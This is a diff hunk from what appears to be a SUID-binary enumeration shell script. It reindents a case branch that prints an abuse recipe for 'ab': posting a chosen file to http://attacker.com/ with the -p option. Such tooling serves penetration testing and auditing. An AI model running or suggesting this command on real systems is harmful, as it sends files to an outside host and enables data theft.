@@ -21,9 +21,9 @@ suidcheck() {
                     found_flag=1
                     ;;
                 "ab")
-					echo Associated Command: URL=http://attacker.com/
-					echo LFILE=file_to_send
-					echo "$full_binary_path" -p \$LFILE \$URL
+                    echo Associated Command: URL=http://attacker.com/
+                    echo LFILE=file_to_send
+                    echo "$full_binary_path" -p \$LFILE \$URL
                     found_flag=1
                     ;;
                 "agetty")
